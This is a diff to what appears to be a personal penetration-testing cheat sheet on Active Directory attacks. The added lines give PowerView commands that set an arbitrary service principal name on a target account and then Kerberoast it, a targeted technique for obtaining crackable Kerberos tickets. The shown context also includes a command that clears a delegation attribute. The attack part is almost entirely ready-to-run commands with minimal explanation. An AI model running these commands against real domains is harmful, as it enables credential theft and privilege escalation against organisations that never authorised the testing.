@@ -298,3 +298,23 @@ Clear the `msds-allowedtoactonbehalfofotheridentity` attribute from the target c
 ```powershell
 Get-DomainComputer $TARGET | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
 ```
+
+---
+
+## Add a SPN To a Principal
+
+```powershell
+Set-DomainObject -Identity $SAM_ACCOUNT_NAME_OF_TARGET_PRINCIPAL -Set @{serviceprincipalname='$SPN'} [-Credential $CREDENTIAL]
+```
+
+- Example `$SPN`: `HOST/blahblah`
+	- Doesn't have to be anything legitimate
+- Example `$CREDENTIAL`: [[powershell#Create a Credential PSCredential Object|PowerShell PSCredential Object]]
+
+---
+
+## Kerberoast a Principal
+
+```powershell
+Invoke-Kerberoast -Identity $PRINCIPAL_TO_KERBEROAST
+```
